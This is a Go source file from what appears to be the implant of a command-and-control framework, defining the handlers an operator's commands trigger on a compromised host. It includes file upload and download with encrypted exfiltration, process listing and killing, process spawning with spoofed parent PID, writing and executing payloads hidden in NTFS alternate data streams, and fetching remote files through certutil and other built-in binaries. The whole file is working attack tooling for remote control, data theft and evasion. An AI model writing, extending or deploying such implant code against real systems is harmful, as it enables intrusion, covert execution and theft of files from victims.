package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	agentexec "github.com/mjopsec/taburtuaiC2/implant/exec"
	"github.com/mjopsec/taburtuaiC2/implant/inject"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleUpload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" {
		result.Error = "Destination path missing"
		result.ExitCode = 1
		return
	}

	fileData := cmd.FileContent
	if cmd.IsEncrypted && agent.crypto != nil {
		decrypted, err := agent.crypto.DecryptData(string(fileData))
		if err != nil {
			result.Error = fmt.Sprintf("Failed to decrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		fileData = decrypted
	}

	if err := os.WriteFile(cmd.DestinationPath, fileData, 0644); err != nil {
		result.Error = fmt.Sprintf("Failed to write file: %v", err)
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("File uploaded successfully to %s", cmd.DestinationPath)
}

func handleDownload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "Source path missing"
		result.ExitCode = 1
		return
	}

	fileData, err := os.ReadFile(cmd.SourcePath)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to read file: %v", err)
		result.ExitCode = 1
		return
	}

	if agent.crypto != nil {
		encrypted, err := agent.crypto.EncryptData(fileData)
		if err != nil {
			result.Error = fmt.Sprintf("Failed to encrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = encrypted
		result.Encrypted = true
	} else {
		result.Output = base64.StdEncoding.EncodeToString(fileData)
		result.Encrypted = false
	}
}

func handleProcessList(_ *types.Command, result *types.CommandResult) {
	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		psCmd := `Get-Process | Select-Object Id,ProcessName,Path,Description | ConvertTo-Json -Compress`
		output, err = exec.Command("powershell", "-NoProfile", "-Command", psCmd).CombinedOutput()
	} else {
		output, err = exec.Command("ps", "-eo", "pid,comm,user,args", "--no-headers").CombinedOutput()
	}

	if err != nil {
		result.Error = fmt.Sprintf("Failed to list processes: %v", err)
		result.ExitCode = 1
		return
	}
	result.Output = strings.TrimSpace(string(output))
}

func handleProcessKill(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessID != 0 {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(cmd.ProcessID)).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("kill", "-9", strconv.Itoa(cmd.ProcessID)).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %d killed", cmd.ProcessID)
			}
		}
	} else if cmd.ProcessName != "" {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/IM", cmd.ProcessName).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("pkill", "-9", "-f", cmd.ProcessName).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %s killed", cmd.ProcessName)
			}
		}
	} else {
		result.Error = "No process ID or name specified"
		result.ExitCode = 1
	}
}

func handleProcessStart(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessPath == "" {
		result.Error = "Process path not specified"
		result.ExitCode = 1
		return
	}

	if cmd.SpoofParentPID > 0 || cmd.SpoofParentName != "" {
		parentPID := cmd.SpoofParentPID
		if parentPID == 0 {
			var err error
			parentPID, err = inject.PidByName(cmd.SpoofParentName)
			if err != nil {
				result.Error = fmt.Sprintf("PPID spoof: %v", err)
				result.ExitCode = 1
				return
			}
		}
		args := strings.Join(cmd.ProcessArgs, " ")
		_, err := inject.SpawnWithPPID(cmd.ProcessPath, args, parentPID)
		if err != nil {
			result.Error = fmt.Sprintf("PPID spoof spawn: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Spawned %s with spoofed PPID %d", cmd.ProcessPath, parentPID)
		return
	}

	execCmd := exec.Command(cmd.ProcessPath, cmd.ProcessArgs...)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("Failed to start process: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Process started: %s", string(output))
	}
}

func handleADSWrite(cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" || len(cmd.FileContent) == 0 {
		result.Error = "ads_write requires destination_path (ADS path) and file_content"
		result.ExitCode = 1
		return
	}
	if err := agentexec.AdsWrite(cmd.DestinationPath, cmd.FileContent); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("Written %d bytes to ADS: %s", len(cmd.FileContent), cmd.DestinationPath)
}

func handleADSRead(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_read requires source_path (ADS path)"
		result.ExitCode = 1
		return
	}
	data, err := agentexec.AdsRead(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = string(data)
}

func handleADSExec(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_exec requires source_path (ADS path, e.g. C:\\file.txt:payload.js)"
		result.ExitCode = 1
		return
	}
	out, err := agentexec.AdsExec(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
	}
	result.Output = out
}

func handleLOLBinFetch(cmd *types.Command, result *types.CommandResult) {
	if cmd.FetchURL == "" || cmd.DestinationPath == "" {
		result.Error = "lolbin_fetch requires fetch_url and destination_path"
		result.ExitCode = 1
		return
	}
	method := cmd.FetchMethod
	if method == "" {
		method = "certutil"
	}
	if err := agentexec.LolbinFetch(cmd.FetchURL, cmd.DestinationPath, method); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Fetched via %s → %s", method, cmd.DestinationPath)
}
